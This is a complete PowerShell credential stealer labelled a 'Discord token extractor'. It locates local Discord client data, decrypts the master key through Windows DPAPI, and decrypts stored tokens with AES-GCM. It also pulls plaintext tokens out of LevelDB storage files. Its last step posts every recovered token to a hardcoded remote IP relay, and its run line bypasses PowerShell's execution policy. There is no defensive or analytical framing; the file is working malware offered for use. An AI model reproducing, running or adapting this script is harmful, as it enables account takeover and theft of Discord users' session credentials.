# Discord token extractor (Windows, local Discord client only)
# Run: powershell -ExecutionPolicy Bypass -File .\get-discord-token.ps1

param(
    [string]$RelayUrl = "http://89.34.90.212:8000/text"
)

function Send-ToRelay {
    param([string]$Message)

    try {
        $r = Invoke-RestMethod -Uri $RelayUrl -Method Post -Body $Message -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
        return ($r.ok -eq $true)
    }
    catch {
        return $false
    }
}

if (-not ([System.Management.Automation.PSTypeName]'DiscordCryptoHelper').Type) {
    Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class DiscordCryptoHelper
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DataBlob
    {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct BcryptAuthInfo : IDisposable
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;

        public BcryptAuthInfo(byte[] nonce, byte[] tag)
        {
            cbSize = Marshal.SizeOf(typeof(BcryptAuthInfo));
            dwInfoVersion = 1;
            pbNonce = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, pbNonce, nonce.Length);
            cbNonce = nonce.Length;
            pbAuthData = IntPtr.Zero;
            cbAuthData = 0;
            pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, pbTag, tag.Length);
            cbTag = tag.Length;
            pbMacContext = IntPtr.Zero;
            cbMacContext = 0;
            cbAAD = 0;
            cbData = 0;
            dwFlags = 0;
        }

        public void Dispose()
        {
            if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
            if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
        }
    }

    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CryptUnprotectData(
        ref DataBlob dataIn,
        IntPtr ppszDataDescr,
        IntPtr optionalEntropy,
        IntPtr reserved,
        IntPtr promptStruct,
        int flags,
        ref DataBlob dataOut);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptOpenAlgorithmProvider(
        out IntPtr phAlgorithm,
        string pszAlgId,
        string pszImplementation,
        uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptSetProperty(
        IntPtr hObject,
        string pszProperty,
        byte[] pbInput,
        int cbInput,
        uint flags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptGenerateSymmetricKey(
        IntPtr hAlgorithm,
        out IntPtr phKey,
        IntPtr pbKeyObject,
        int cbKeyObject,
        byte[] pbSecret,
        int cbSecret,
        uint flags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptDecrypt(
        IntPtr hKey,
        byte[] pbInput,
        int cbInput,
        ref BcryptAuthInfo pPaddingInfo,
        byte[] pbIV,
        int cbIV,
        byte[] pbOutput,
        int cbOutput,
        out int pcbResult,
        uint flags);

    [DllImport("bcrypt.dll")]
    private static extern uint BCryptDestroyKey(IntPtr hKey);

    public static byte[] Unprotect(byte[] encryptedKey)
    {
        var input = new DataBlob();
        input.pbData = Marshal.AllocHGlobal(encryptedKey.Length);
        input.cbData = encryptedKey.Length;
        Marshal.Copy(encryptedKey, 0, input.pbData, encryptedKey.Length);

        var output = new DataBlob();
        try
        {
            if (!CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref output))
                return null;

            var result = new byte[output.cbData];
            Marshal.Copy(output.pbData, result, 0, output.cbData);
            return result;
        }
        finally
        {
            if (input.pbData != IntPtr.Zero) Marshal.FreeHGlobal(input.pbData);
            if (output.pbData != IntPtr.Zero) Marshal.FreeHGlobal(output.pbData);
        }
    }

    public static string DecryptToken(byte[] masterKey, byte[] encrypted)
    {
        if (encrypted == null || encrypted.Length < 31 || masterKey == null)
            return null;

        var nonce = new byte[12];
        var tag = new byte[16];
        var cipher = new byte[encrypted.Length - 31];

        Array.Copy(encrypted, 3, nonce, 0, 12);
        Array.Copy(encrypted, encrypted.Length - 16, tag, 0, 16);
        Array.Copy(encrypted, 15, cipher, 0, cipher.Length);

        var plain = DecryptAesGcm(masterKey, nonce, cipher, tag);
        return plain == null ? null : Encoding.UTF8.GetString(plain);
    }

    private static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] cipher, byte[] tag)
    {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        BcryptAuthInfo auth = new BcryptAuthInfo(nonce, tag);

        try
        {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0)
                return null;

            var gcmMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            if (BCryptSetProperty(hAlg, "ChainingMode", gcmMode, gcmMode.Length, 0) != 0)
                return null;

            if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0)
                return null;

            var output = new byte[cipher.Length];
            int resultSize;
            if (BCryptDecrypt(hKey, cipher, cipher.Length, ref auth, null, 0, output, output.Length, out resultSize, 0) != 0)
                return null;

            if (resultSize != output.Length)
            {
                var trimmed = new byte[resultSize];
                Array.Copy(output, trimmed, resultSize);
                return trimmed;
            }

            return output;
        }
        finally
        {
            auth.Dispose();
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
'@
}

function Read-SharedFileText {
    param([string]$Path)

    try {
        $fs = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
        )
        try {
            $bytes = New-Object byte[] $fs.Length
            if ($fs.Length -gt 0) {
                [void]$fs.Read($bytes, 0, $bytes.Length)
            }
            return [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)
        }
        finally {
            $fs.Dispose()
        }
    }
    catch {
        return $null
    }
}

function Add-TokensFromText {
    param(
        [string]$Raw,
        [byte[]]$MasterKey,
        [System.Collections.Generic.HashSet[string]]$Found
    )

    if ([string]::IsNullOrEmpty($Raw)) { return }

    $tokenRe = [regex]'[\w-]{18,}\.[\w-]{6}\.[\w-]{25,}|mfa\.[\w-]{80,}'
    $encRe   = [regex]'dQw4w9WgXcQ:[A-Za-z0-9+/=]+'

    foreach ($m in $tokenRe.Matches($Raw)) {
        [void]$Found.Add($m.Value)
    }

    if (-not $MasterKey) { return }

    foreach ($m in $encRe.Matches($Raw)) {
        $b64 = ($m.Value -replace '^dQw4w9WgXcQ:', '').TrimEnd('"')
        try {
            $enc = [Convert]::FromBase64String($b64)
            $dec = [DiscordCryptoHelper]::DecryptToken($MasterKey, $enc)
            if ($dec -and $tokenRe.IsMatch($dec)) {
                [void]$Found.Add($dec)
            }
        }
        catch { }
    }
}

function Get-TokensFromLevelDb {
    param(
        [string]$LevelDbPath,
        [byte[]]$MasterKey = $null
    )

    $found = [System.Collections.Generic.HashSet[string]]::new()

    @(
        Get-ChildItem -Path $LevelDbPath -File -Filter *.ldb -ErrorAction SilentlyContinue
        Get-ChildItem -Path $LevelDbPath -File -Filter *.log -ErrorAction SilentlyContinue
    ) | ForEach-Object {
        $raw = Read-SharedFileText -Path $_.FullName
        Add-TokensFromText -Raw $raw -MasterKey $MasterKey -Found $found
    }

    return $found
}

function Get-DiscordRoots {
    $candidates = @(
        "$env:APPDATA\Discord"
        "$env:APPDATA\discord"
        "$env:APPDATA\DiscordCanary"
        "$env:APPDATA\discordcanary"
        "$env:APPDATA\DiscordPTB"
        "$env:APPDATA\discordptb"
        "$env:LOCALAPPDATA\Discord"
        "$env:LOCALAPPDATA\discord"
        "$env:LOCALAPPDATA\DiscordCanary"
        "$env:LOCALAPPDATA\DiscordPTB"
    )

    $seen = @{}
    $roots = @()

    foreach ($path in $candidates) {
        if (-not (Test-Path $path)) { continue }
        try {
            $resolved = (Resolve-Path $path).Path
            $key = $resolved.ToLowerInvariant()
        }
        catch { continue }

        if ($seen.ContainsKey($key)) { continue }
        $seen[$key] = $true
        $roots += $resolved
    }

    return $roots
}

$allTokens = [System.Collections.Generic.HashSet[string]]::new()

foreach ($root in (Get-DiscordRoots)) {
    $masterKey = $null
    $localState = Join-Path $root "Local State"
    if (Test-Path $localState) {
        try {
            $json = Get-Content $localState -Raw | ConvertFrom-Json
            if ($json.os_crypt.encrypted_key) {
                $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $payload = $encKey[5..($encKey.Length - 1)]
                $masterKey = [DiscordCryptoHelper]::Unprotect($payload)
            }
        }
        catch { }
    }

    $storagePaths = @(
        (Join-Path $root "Local Storage\leveldb")
        (Join-Path $root "Session Storage")
    )

    foreach ($storagePath in $storagePaths) {
        if (-not (Test-Path $storagePath)) { continue }
        $tokens = Get-TokensFromLevelDb -LevelDbPath $storagePath -MasterKey $masterKey
        foreach ($t in $tokens) { [void]$allTokens.Add($t) }
    }
}

if ($allTokens.Count -eq 0) {
    exit 1
}

$msg = ($allTokens | ForEach-Object { $_ }) -join "`n"
Send-ToRelay -Message $msg | Out-Null
exit 0
